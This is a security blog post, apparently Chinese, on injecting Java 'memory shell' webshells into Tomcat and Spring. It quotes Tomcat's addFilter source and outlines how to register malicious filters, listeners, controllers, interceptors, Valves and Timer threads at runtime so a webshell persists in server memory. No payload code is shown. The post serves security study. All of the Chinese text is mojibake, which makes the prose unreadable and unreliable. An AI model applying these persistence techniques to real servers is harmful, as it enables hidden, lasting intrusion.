<p>Filterçš„é…ç½®å†é…ç½®æ–‡ä»¶å’Œæ³¨è§£ä¸­ï¼Œåœ¨å…¶ä»–ä»£ç ä¸­å¦‚æœæƒ³è¦å®Œæˆæ³¨å†Œï¼Œä¸»è¦æœ‰ä»¥ä¸‹æ–¹å¼ï¼š</p>
<ul>
<li>ä½¿ç”¨ ServletContext çš„ addFilter&#x2F;createFilter æ–¹æ³•æ³¨å†Œï¼›</li>
<li>ä½¿ç”¨ ServletContextListener çš„ contextInitialized æ–¹æ³•åœ¨æœåŠ¡å™¨å¯åŠ¨æ—¶æ³¨å†Œï¼ˆå°†ä¼šåœ¨ Listener ä¸­è¿›è¡Œæè¿°ï¼‰ï¼›</li>
<li>ä½¿ç”¨ ServletContainerInitializer çš„ onStartup æ–¹æ³•åœ¨åˆå§‹åŒ–æ—¶æ³¨å†Œï¼ˆéåŠ¨æ€ï¼Œåé¢ä¼šæè¿°ï¼‰ã€‚</li>
</ul>
<p>è¿™é‡Œå…ˆåªè®¨è®ºä½¿ç”¨servletContextçš„addFilteræ–¹æ³•ã€‚åºŸè¯ä¸å¤šè¯´ï¼Œç›´æ¥ä¸Šæºç </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> FilterRegistration.Dynamic <span class="title function_">addFilter</span><span class="params">(String filterName,</span></span><br><span class="line"><span class="params">        String filterClass, Filter filter)</span> <span class="keyword">throws</span> IllegalStateException &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (filterName == <span class="literal">null</span> || filterName.equals(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(sm.getString(</span><br><span class="line">                <span class="string">&quot;applicationContext.invalidFilterName&quot;</span>, filterName));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!context.getState().equals(LifecycleState.STARTING_PREP)) &#123;</span><br><span class="line">        <span class="comment">//TODO Spec breaking enhancement to ignore this restriction</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(</span><br><span class="line">                sm.getString(<span class="string">&quot;applicationContext.addFilter.ise&quot;</span>,</span><br><span class="line">                        getContextPath()));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">FilterDef</span> <span class="variable">filterDef</span> <span class="operator">=</span> context.findFilterDef(filterName);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Assume a &#x27;complete&#x27; FilterRegistration is one that has a class and</span></span><br><span class="line">    <span class="comment">// a name</span></span><br><span class="line">    <span class="keyword">if</span> (filterDef == <span class="literal">null</span>) &#123;</span><br><span class="line">        filterDef = <span class="keyword">new</span> <span class="title class_">FilterDef</span>();</span><br><span class="line">        filterDef.setFilterName(filterName);</span><br><span class="line">        context.addFilterDef(filterDef);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (filterDef.getFilterName() != <span class="literal">null</span> &amp;&amp;</span><br><span class="line">                filterDef.getFilterClass() != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (filter == <span class="literal">null</span>) &#123;</span><br><span class="line">        filterDef.setFilterClass(filterClass);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        filterDef.setFilterClass(filter.getClass().getName());</span><br><span class="line">        filterDef.setFilter(filter);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ApplicationFilterRegistration</span>(filterDef, context);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä½†æ˜¯æˆ‘ä»¬æœ‰äº†ä¸Šé¢çš„åˆ†æç»éªŒï¼Œä¸éš¾çœ‹å‡ºè¿™é‡Œï¼Œæœ€ååªæ˜¯è¿”å›äº†<code>new </code>å¯¹è±¡ã€‚è¿™æ ·æ˜¯ä¸èƒ½å®ŒæˆåŠ è½½çš„ã€‚</p>
<p>æœ‰è¿‡å¼€å‘çš„ç»éªŒçš„ï¼Œéƒ½çŸ¥é“filterè°ƒç”¨ä¹‹åï¼Œéƒ½è¦è¿”å›åˆ°<code>filterChain</code>,äºæ˜¯å°±æƒ³æ˜¯ä¸æ˜¯å¯ä»¥ç›´æ¥æ“ä½œ<code>filterChain</code>ï¼Œè¿™ä¸ªç±»çš„å®ç°æ–¹å¼ä¸­çš„ç¡®æä¾›äº†<code>addFilter</code>æ–¹æ³•ï¼Œä½†æ˜¯<code>å¯¹äºæ¯ä¸ªè¯·æ±‚éœ€è¦æ‰§è¡Œçš„filterChainéƒ½æ˜¯åŠ¨æ€å–å¾—çš„</code>ã€‚é‚£<code>Tomcat</code>å…·ä½“æ˜¯æ€ä¹ˆå¤„ç†çš„å‘¢ï¼Ÿ</p>
<ul>
<li>åœ¨ context ä¸­è·å– filterMapsï¼Œå¹¶éå†åŒ¹é… url åœ°å€å’Œè¯·æ±‚æ˜¯å¦åŒ¹é…ï¼›</li>
<li>å¦‚æœåŒ¹é…åˆ™åœ¨ context ä¸­æ ¹æ® filterMaps ä¸­çš„ filterName æŸ¥æ‰¾å¯¹åº”çš„ filterConfigï¼›</li>
<li>å¦‚æœè·å–åˆ° filterConfigï¼Œåˆ™å°†å…¶åŠ å…¥åˆ° filterChain ä¸­</li>
<li>å¾ªç¯fileterChainä¸­çš„filterConfigï¼Œé€šè¿‡<code>getFilter</code>æ–¹æ³•è·å–filterå¹¶ä¸”æ‰§è¡ŒdoFilter.</li>
</ul>
<p>æ‰€ä»¥æ¯æ¬¡è¯·æ±‚çš„filterChainéƒ½æ˜¯åŠ¨æ€åŒ¹é…ç”Ÿæˆçš„ï¼Œå¦‚æœæƒ³æ·»åŠ çš„è¯ï¼Œå°±å¿…é¡»<code> StandardContext ä¸­ filterMaps ä¸­æ·»åŠ  FilterMap</code>.</p>
<p>é‚£ä¹ˆå¦‚æœç°åœ¨æƒ³è¦åŠ¨æ€æ·»åŠ ä¸€ä¸ª<code>filter</code>,éœ€è¦åœ¨<code>context</code>ä¸­çš„filterMapsä¸­æ·»åŠ FilterMapï¼Œåœ¨filetrConfigsä¸­æ·»åŠ <code>filterConfig</code>,è¿™æ ·åœ¨ç¨‹åºåˆ›å»ºçš„æ—¶å€™å°±æ‰¾åˆ°filteräº†ã€‚</p>
<p>åœ¨StandardContextçš„filterStartæ–¹æ³•ä¸­ç”ŸæˆfilterConfigã€‚æ‰€ä»¥ç°åœ¨æ·»åŠ filterçš„æ€è·¯å¤§æ¦‚å°±æ˜¯</p>
<ul>
<li>è°ƒç”¨ ApplicationContext çš„ addFilter æ–¹æ³•åˆ›å»º filterDefs å¯¹è±¡ï¼Œéœ€è¦åå°„ä¿®æ”¹åº”ç”¨ç¨‹åºçš„è¿è¡ŒçŠ¶æ€ï¼ŒåŠ å®Œä¹‹åå†æ”¹å›æ¥ï¼›</li>
<li>è°ƒç”¨ StandardContext çš„ filterStart æ–¹æ³•ç”Ÿæˆ filterConfigsï¼›</li>
<li>è°ƒç”¨ ApplicationFilterRegistration çš„ addMappingForUrlPatterns ç”Ÿæˆ filterMapsï¼›</li>
<li>ä¸ºäº†å…¼å®¹ï¼šå»ºè®®æŠŠæˆ‘ä»¬çš„filteræ”¾åœ¨é¦–ä½ã€‚</li>
</ul>
<h3 id="åŠ¨æ€æ³¨å…¥Listener"><a href="#åŠ¨æ€æ³¨å…¥Listener" class="headerlink" title="åŠ¨æ€æ³¨å…¥Listener"></a>åŠ¨æ€æ³¨å…¥Listener</h3><p>åº”ç”¨ä¸­å¸¸è§çš„Listener</p>
<ul>
<li>ServletContextListenerï¼šç”¨äºç›‘å¬æ•´ä¸ª Servlet ä¸Šä¸‹æ–‡ï¼ˆåˆ›å»ºã€é”€æ¯ï¼‰</li>
<li>ServletContextAttributeListenerï¼šå¯¹ Servlet ä¸Šä¸‹æ–‡å±æ€§è¿›è¡Œç›‘å¬ï¼ˆå¢åˆ æ”¹å±æ€§ï¼‰</li>
<li>ServletRequestListenerï¼šå¯¹ Request è¯·æ±‚è¿›è¡Œç›‘å¬ï¼ˆåˆ›å»ºã€é”€æ¯ï¼‰</li>
<li>ServletRequestAttributeListenerï¼šå¯¹ Request å±æ€§è¿›è¡Œç›‘å¬ï¼ˆå¢åˆ æ”¹å±æ€§ï¼‰</li>
<li>javax.servlet.http.HttpSessionListenerï¼šå¯¹ Session æ•´ä½“çŠ¶æ€çš„ç›‘å¬</li>
<li>javax.servlet.http.HttpSessionAttributeListenerï¼šå¯¹ Session å±æ€§çš„ç›‘å¬</li>
</ul>
<p>å‰é¢ä¸­æˆ‘ä»¬å¯ä»¥çœ‹åˆ°è®¸å¤šçš„Listenerï¼Œè¿™æ¬¡è¦ä½¿ç”¨çš„Listeneræ˜¯<code>ServletRequestListener</code>ï¼ˆç›‘å¬requestçš„responseçš„äº§ç”Ÿå’Œé”€æ¯ï¼‰,åœ¨<code>Tomcat</code>ä¸­çš„ä»–å­˜å‚¨åœ¨<code> StandardContext #applicationEventListenersObjects</code>ã€‚</p>
<p><img src="https://img.dem0dem0.top/images/image-20220717155533621.png" alt="image-20220717155533621"></p>
<p>å¯ä»¥çœ‹åˆ°æœ‰ä¸¤ä¸ªæ–¹æ³•<code>requestInitialized</code> å’Œ <code>requestDestroyed</code>.ä¸¤ä¸ªæ–¹æ³•å‡æ¥æ”¶ ServletRequestEvent ä½œä¸ºå‚æ•°ï¼ŒServletRequestEvent ä¸­åˆå‚¨å­˜äº† ServletContext å¯¹è±¡å’Œ ServletRequest å¯¹è±¡ï¼Œå› æ­¤åœ¨è®¿é—®è¯·æ±‚è¿‡ç¨‹ä¸­æˆ‘ä»¬å¯ä»¥åœ¨ request åˆ›å»ºå’Œé”€æ¯æ—¶å®ç°è‡ªå·±çš„æ¶æ„ä»£ç ï¼Œå®Œæˆå†…å­˜é©¬çš„å®ç°ã€‚ä¸€èµ·æ¥æ³¨æ„ç©æ³•</p>
<h4 id="æ‹“å±•"><a href="#æ‹“å±•" class="headerlink" title="æ‹“å±•:"></a>æ‹“å±•:</h4><p><img src="https://img.dem0dem0.top/images/image-20220717181219915.png" alt="image-20220717181219915"></p>
<h3 id="æ§åˆ¶å™¨-æ‹¦æˆªå™¨-ç®¡é“"><a href="#æ§åˆ¶å™¨-æ‹¦æˆªå™¨-ç®¡é“" class="headerlink" title="æ§åˆ¶å™¨ æ‹¦æˆªå™¨ ç®¡é“"></a>æ§åˆ¶å™¨ æ‹¦æˆªå™¨ ç®¡é“</h3><p>ä¸Šé¢çš„tomcatä¸‰ä»¶å¥—æ˜¯ä¸æ˜¯å’ŒSpring MVC ä¸€æ¨¡ä¸€æ ·ï¼Œè®©æˆ‘ä»¬å¿«ç‚¹æ¥è¯•ä¸€è¯•æŠŠã€‚</p>
<h4 id="åŠ¨æ€æ³¨å…¥Controller"><a href="#åŠ¨æ€æ³¨å…¥Controller" class="headerlink" title="åŠ¨æ€æ³¨å…¥Controller"></a>åŠ¨æ€æ³¨å…¥Controller</h4><blockquote>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/w-y-c-m/p/8416630.html">SpringMVCæºç ä¹‹ControlleræŸ¥æ‰¾åŸç† - å§é¢œæ²‰é»˜ - åšå®¢å›­ (cnblogs.com)</a></p>
</blockquote>
<p>é¦–å…ˆçœ‹ä¸€ä¸‹<code>Spring MVC</code>å¯¹äº<code>Controller</code>æœ¬èº«çš„å¤„ç†ã€‚çœ‹ä»¥ä¸‹ä¸¤ä¸ªç±»</p>
<ul>
<li>RequestMappingInfo: ä¸€ä¸ªå°è£…ç±»ï¼Œå¯¹ä¸€æ¬¡httpè¯·æ±‚ä¸­çš„ä¿¡æ¯è¿›è¡Œå°è£…</li>
<li>HandlerMethod: å¯¹Controllerä¸­çš„å¤„ç†è¯·æ±‚æ–¹æ³•è¿›è¡Œå°è£…ï¼Œé‡Œé¢åŒ…å«äº†çš„è¯¥æ–¹æ³•æ‰€å±çš„bean,method,å‚æ•°ç­‰ã€‚</li>
</ul>
<p><code>RequestMappingHandlerMapping</code>æ˜¯springä¸­ç”¨æ¥å¤„ç†<code>@Controller</code>æ³¨è§£ç±»ä¸­çš„æ–¹æ³•çº§åˆ«<code>@RequestMapping</code>ä»¥åŠ<code>RequestMappingInfo</code>å®ä¾‹çš„åˆ›å»ºã€‚ä¸‹é¢çœ‹ä¸€ä¸‹å…·ä½“çš„æµç¨‹ã€‚</p>
<p>å› ä¸º<code>MVC</code>åœ¨åˆå§‹åŒ–æ—¶ï¼Œåœ¨æ¯ä¸ªå®¹å™¨çš„ bean æ„é€ æ–¹æ³•ã€å±æ€§è®¾ç½®ä¹‹åï¼Œå°†ä¼šä½¿ç”¨ InitializingBean çš„ <code>afterPropertiesSet</code> æ–¹æ³•è¿›è¡Œ Bean çš„åˆå§‹åŒ–æ“ä½œã€‚æ‰€ä»¥ä¸Šé¢è¿™ä¸ªç±»å…ˆçœ‹ä»–çš„è¿™ä¸ªæ–¹æ³•</p>
<p><img src="https://img.dem0dem0.top/images/image-20220717182928738.png"></p>
<p>ä¸éš¾å‘ç°å…¶å®å°±ä¸¤æ­¥ï¼Œ</p>
<ul>
<li>åˆ›å»ºä¸€ä¸ª<code>RequestMappingInfo.BuilderConfiguration()</code></li>
<li>è°ƒç”¨çˆ¶ç±»çš„<code>afterPropertiesSet</code></li>
</ul>
<p>è¿™é‡Œçš„çˆ¶ç±»æ˜¯<code>AbstractHandlerMethodMapping</code>.å°±è°ƒç”¨äº†ä¸€ä¸ªæ–¹æ³•ã€‚</p>
<p><img src="https://img.dem0dem0.top/images/image-20220717183213812.png" alt="image-20220717183213812"></p>
<p>åœ¨è¿™ä¸ªæ–¹æ³•ä¸­</p>
<p><img src="https://img.dem0dem0.top/images/image-20220717183357804.png" alt="image-20220717183357804"></p>
<p><img src="https://img.dem0dem0.top/images/image-20220717183525248.png" alt="image-20220717183525248"></p>
<p><code>detectHandlerMethods</code>æ–¹æ³•</p>
<p><img src="https://img.dem0dem0.top/images/image-20220717184106090.png" alt="image-20220717184106090"></p>
<p>éå†å¹¶ä¸”æ³¨å†Œ</p>
<p><img src="https://img.dem0dem0.top/images/image-20220717184143260.png" alt="image-20220717184143260"></p>
<p>å…³é”®ä¿¡æ¯è®°å½•</p>
<p><img src="https://img.dem0dem0.top/images/image-20220717184235967.png" alt="image-20220717184235967"><br>ä¸Šé¢éƒ½æ˜¯åˆå§‹åŒ–çš„æµç¨‹ï¼Œä¸‹é¢æ˜¯æŸ¥æ‰¾æµç¨‹:</p>
<p>åœ¨ AbstractHandlerMethodMapping çš„ lookupHandlerMethod æ–¹æ³•ï¼š</p>
<ul>
<li>åœ¨ MappingRegistry.urlLookup ä¸­è·å–ç›´æ¥åŒ¹é…çš„ RequestMappingInfos</li>
<li>å¦‚æœæ²¡æœ‰ï¼Œåˆ™éå†æ‰€æœ‰çš„ MappingRegistry.mappingLookup ä¸­ä¿å­˜çš„ RequestMappingInfos</li>
<li>è·å–æœ€ä½³åŒ¹é…çš„ RequestMappingInfo å¯¹åº”çš„ HandlerMethod</li>
</ul>
<p>ä¸‹é¢å°±æ˜¯åŠ¨æ€æ³¨å†Œ<code>Controller</code>.Landgreyå¸ˆå‚…åœ¨ä»–çš„<a target="_blank" rel="noopener" href="https://landgrey.me/blog/12/">blog</a>é‡Œé¢è®°å½•äº†å¾ˆå¤šçš„æ¥å£å¯ä»¥ä½¿ç”¨ã€‚è¿™é‡Œæˆ‘ä»¬é€‰æ‹©æ¯”è¾ƒç®€å•çš„ã€‚å…·ä½“ä»£ç è§<code>EvilController</code>,è¿™æ˜¯ä¸€ç§æ¯”è¾ƒç®€å•çš„å®ç°ï¼Œå…·ä½“å›°éš¾çš„å®ç°å’Œç°å®æƒ…å†µä¸­çš„bypassï¼Œå°±é åç»­çš„å®Œå–„äº†ã€‚</p>
<h4 id="åŠ¨æ€æ³¨å†Œæ‹¦æˆªå™¨"><a href="#åŠ¨æ€æ³¨å†Œæ‹¦æˆªå™¨" class="headerlink" title="åŠ¨æ€æ³¨å†Œæ‹¦æˆªå™¨"></a>åŠ¨æ€æ³¨å†Œæ‹¦æˆªå™¨</h4><p>æ‹¦æˆªå™¨æ˜¯Springä½¿ç”¨<code>AOP</code>å¯¹äº<code>Filter</code>æ€æƒ³çš„å¦å¤–ä¸€ç§å®ç°ï¼Œåœ¨å…¶ä»–çš„æ¡†æ¶ä¸­ä¹Ÿæœ‰æ‹¦æˆªå™¨çš„æ€æƒ³ã€‚</p>
<p>ç®€å•ç”¨<code>su18</code>å¸ˆå‚…çš„è¯æ¥æ€»ç»“ä¸€ä¸‹ï¼Œæ‹¦æˆªå™¨çš„å·¥ä½œæµç¨‹ã€‚</p>
<p><img src="https://img.dem0dem0.top/images/image-20220717193925778.png" alt="image-20220717193925778"></p>
<p><img src="https://img.dem0dem0.top/images/image-20220717194058281.png" alt="image-20220717194058281"></p>
<h4 id="Tomcat-Valve-æ³¨å…¥"><a href="#Tomcat-Valve-æ³¨å…¥" class="headerlink" title="Tomcat Valve æ³¨å…¥"></a>Tomcat Valve æ³¨å…¥</h4><blockquote>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/coldridgeValley/p/5816414.html">Tomcatä¸­å®¹å™¨çš„pipelineæœºåˆ¶ - coldridgeValley - åšå®¢å›­ (cnblogs.com)</a> </p>
</blockquote>
<p>ç®€å•ä»‹ç»ä¸€ä¸‹ï¼Œå…·ä½“çš„å‚è€ƒä¸Šé¢çš„é“¾æ¥ã€‚è¿™é‡Œæ¶‰åŠäº†<code>Tomcat</code>æ˜¯å¦‚ä½•å¤„ç†å’Œä¼ é€’<code>request</code>å’Œ<code>response</code>çš„ã€‚Tomcaté‡‡å–çš„æ˜¯èŒè´£é“¾æ¨¡å¼ï¼Œå®ƒå®šä¹‰äº†ä¸¤ä¸ªæ¥å£<code>Pipeline</code>å’Œ<code>Valve</code>.</p>
<p><img src="https://su18.org/post-images/1623645442719.jpg" alt="img"></p>
<p>ç„¶åæŒ‰ç…§ä¸‹é¢è¿™æ ·ç»è¥ç€ã€‚æ•°æ®ä»è¿æ¥å™¨åˆ°æ¯ä¸€ä¸ªValveç„¶åå†é€šè¿‡Pipeline(addValveæ–¹æ³•å¯ä»¥æ·»åŠ )ä¼ é€’åˆ°ä¸‹ä¸€ä¸ªValveã€‚ä¸‹é¢æ˜¯ä»–ä»¬çš„å®šä¹‰ã€‚</p>
<p><img src="https://img.dem0dem0.top/images/image-20220717220156384.png" alt="image-20220717220156384"></p>
<p><code>Valve#invoke</code>å°±æ˜¯æ‰§è¡Œä¸šåŠ¡é€»è¾‘çš„åœ°æ–¹ã€‚</p>
<p><img src="https://img.dem0dem0.top/images/image-20220717220230869.png" alt="image-20220717220230869"></p>
<p>Tomcatä¸­çš„Pipelineä»…æœ‰ä¸€ä¸ªå®ç°å°±æ˜¯<code> StandardPipeline</code>,å­˜æ”¾åœ¨<code>ContainerBase çš„ pipeline å±æ€§ä¸­</code>.å¹¶ä¸” ContainerBase æä¾› <code>addValve</code> æ–¹æ³•è°ƒç”¨ StandardPipeline çš„ addValve æ–¹æ³•æ·»åŠ ã€‚Tomcatä¸­çš„å››ä¸ªå±‚çº§éƒ½ç»§æ‰¿äº†ContainerBaseï¼Œæ‰€ä»¥å“ªä¸ªå±‚çº§éƒ½å¯ä»¥æ·»åŠ è‡ªå®šä¹‰çš„Valveå‡å¯ã€‚æ·»åŠ åï¼Œå°†ä¼šåœ¨ <code>org.apache.catalina.connector.CoyoteAdapter</code> çš„ <code>service</code> æ–¹æ³•ä¸­è°ƒç”¨ Valve çš„ <code>invoke</code> æ–¹æ³•ã€‚æ¥ä¸‹æ¥å»å®ç°å³å¯ã€‚</p>
<h3 id="è¿›ç¨‹æ³¨å…¥"><a href="#è¿›ç¨‹æ³¨å…¥" class="headerlink" title="è¿›ç¨‹æ³¨å…¥"></a>è¿›ç¨‹æ³¨å…¥</h3><blockquote>
<p><a target="_blank" rel="noopener" href="https://cn-sec.com/archives/710084.html">https://cn-sec.com/archives/710084.html</a></p>
</blockquote>
<p>åˆ©ç”¨çš„æ˜¯javaä¸­timerçš„ç‰¹æ€§ï¼Œå¯åŠ¨Timerè¿›ç¨‹ï¼Œåœ¨å…¶ä¸­æ‰§è¡Œwebshellçš„é€»è¾‘ï¼Œå¦‚æœä¸æ˜¯æ‰€æœ‰å·²ç»å®Œæˆçš„ä»»åŠ¡éƒ½å·²ç»å®Œæˆæ‰§è¡Œï¼Œæˆ–ä¸è°ƒç”¨Timerå¯¹è±¡çš„cancelæ–¹æ³•ï¼Œè¿™ä¸ªçº¿ç¨‹å°±ä¸ä¼šåœæ­¢ï¼Œä¹Ÿä¸ä¼šå›æ”¶ã€‚å› ä¸ºä¸åœ¨webçš„ä¸Šä¸‹æ–‡ä¸­ï¼Œå¯èƒ½æ‰¾åˆ°reqeustå’Œresponseæœ‰å›°éš¾ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥éå†çº¿ç¨‹ã€‚(å¯æ˜¯è¿™æ ·éœ€è¦ç¢°æ’æ‰è¡Œï¼Œå¾ˆç¦»è°±ã€‚ã€‚ã€‚)</p>
<h2 id="TODO"><a href="#TODO" class="headerlink" title="TODO"></a>TODO</h2><ul>
<li>JAVA Agentæ³¨å…¥</li>
</ul>
<h2 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h2><ul>
<li><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/HODFJF3NJmsDW2Lcd-ebIg">å†…å­˜é©¬æ”»é˜²å®æˆ˜â€“æ”»å‡»åŸºç¡€ç¯‡</a>ä¸»è¦æ˜¯ä¸€äº›åŸºç¡€çŸ¥è¯†</li>
<li><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/OVsdm6DST6ISgMy5rkBAiA">æ‰‹æŠŠæ‰‹æ•™ä¼šä½ é˜²å¾¡Javaå†…å­˜é©¬</a></li>
<li><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/cbe1c3174d41">åŠ¨æ€æ³¨å†Œä¹‹Servlet+Filter+Listener</a></li>
<li><a target="_blank" rel="noopener" href="https://su18.org/post/memory-shell">JavaWeb å†…å­˜é©¬ä¸€å‘¨ç›®é€šå…³æ”»ç•¥</a></li>
</ul>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">æ–‡ç« ä½œè€…: </span><span class="post-copyright-info"><a href="https://dem0dem0.top">Dem0</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">æ–‡ç« é“¾æ¥: </span><span class="post-copyright-info"><a href="https://dem0dem0.top/2022/07/18/JAVA%E5%86%85%E5%AD%98%E9%A9%AC%E6%94%BB%E5%87%BB%E7%AF%87/">https://dem0dem0.top/2022/07/18/JAVAå†…å­˜é©¬æ”»å‡»ç¯‡/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">ç‰ˆæƒå£°æ˜: </span><span class="post-copyright-info">æœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜æ¥è‡ª <a href="https://dem0dem0.top" target="_blank">Dem0ã®blog</a>ï¼</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/JAVA%E5%AE%89%E5%85%A8-memshell/">JAVAå®‰å…¨, memshell</a></div><div class="post_share"><div class="social-share" data-image="/img/cover4.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/gh/overtrue/share.js@master/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2022/07/20/GoogleCTF2022%E5%A4%8D%E7%8E%B0/"><img class="prev-cover" src="/img/cover3.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">ä¸Šä¸€ç¯‡</div><div class="prev_info">GoogleCTF2022å¤ç°</div></div></a></div><div class="next-post pull-right"><a href="/2022/07/08/XXE%E5%A4%87%E5%BF%98%E5%BD%95/"><img class="next-cover" src="/img/cover5.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">ä¸‹ä¸€ç¯‡</div><div class="next_info">XXEå¤‡å¿˜å½•</div></div></a></div></nav><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> è¯„è®º</span></div></div><div class="comment-wrap"><div><div id="gitalk-container"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://q1.qlogo.cn/g?b=qq&amp;nk=79475432&amp;s=640" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Dem0</div><div class="author-info__description">ä¸€ä¸ªä»€ä¹ˆéƒ½æƒ³å­¦çš„webğŸ•</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">æ–‡ç« </div><div class="length-num">12</div></a><a href="/tags/"><div class="headline">æ ‡ç­¾</div><div class="length-num">6</div></a><a href="/categories/"><div class="headline">åˆ†ç±»</div><div class="length-num">5</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/3em0"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="/atom.xml" target="_blank" title="RSSé“¾æ¥"><i class="fa fa-rss"></i></a><a class="social-icon" href="https://github.com/3em0" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="tencent://AddContact/?fromId=45&amp;fromSubId=1&amp;subcmd=all&amp;uin=79475432&amp;website=www.oicqzone.com" target="_blank" title="Github"><i class="fab fa-qq"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>å…¬å‘Š</span></div><div class="announcement_content">Misfortune meets love; Maintain love for network security;</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>ç›®å½•</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#JAVA%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">1.</span> <span class="toc-text">JAVAå†…å­˜é©¬</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E6%94%BB%E5%87%BB%E9%9D%A2"><span class="toc-number">1.1.</span> <span class="toc-text">å†…å­˜é©¬çš„æ”»å‡»é¢</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87"><span class="toc-number">1.2.</span> <span class="toc-text">ç¯å¢ƒå‡†å¤‡</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Tomcat-%E5%8A%A8%E6%80%81%E6%B3%A8%E5%86%8C"><span class="toc-number">1.3.</span> <span class="toc-text">Tomcat åŠ¨æ€æ³¨å†Œ</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8A%A8%E6%80%81%E6%B3%A8%E5%85%A5Servlet"><span class="toc-number">1.3.1.</span> <span class="toc-text">åŠ¨æ€æ³¨å…¥Servlet</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8A%A8%E6%80%81%E6%B3%A8%E5%85%A5Filter"><span class="toc-number">1.3.2.</span> <span class="toc-text">åŠ¨æ€æ³¨å…¥Filter</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8A%A8%E6%80%81%E6%B3%A8%E5%85%A5Listener"><span class="toc-number">1.3.3.</span> <span class="toc-text">åŠ¨æ€æ³¨å…¥Listener</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8B%93%E5%B1%95"><span class="toc-number">1.3.3.1.</span> <span class="toc-text">æ‹“å±•:</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8E%A7%E5%88%B6%E5%99%A8-%E6%8B%A6%E6%88%AA%E5%99%A8-%E7%AE%A1%E9%81%93"><span class="toc-number">1.3.4.</span> <span class="toc-text">æ§åˆ¶å™¨ æ‹¦æˆªå™¨ ç®¡é“</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8A%A8%E6%80%81%E6%B3%A8%E5%85%A5Controller"><span class="toc-number">1.3.4.1.</span> <span class="toc-text">åŠ¨æ€æ³¨å…¥Controller</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8A%A8%E6%80%81%E6%B3%A8%E5%86%8C%E6%8B%A6%E6%88%AA%E5%99%A8"><span class="toc-number">1.3.4.2.</span> <span class="toc-text">åŠ¨æ€æ³¨å†Œæ‹¦æˆªå™¨</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Tomcat-Valve-%E6%B3%A8%E5%85%A5"><span class="toc-number">1.3.4.3.</span> 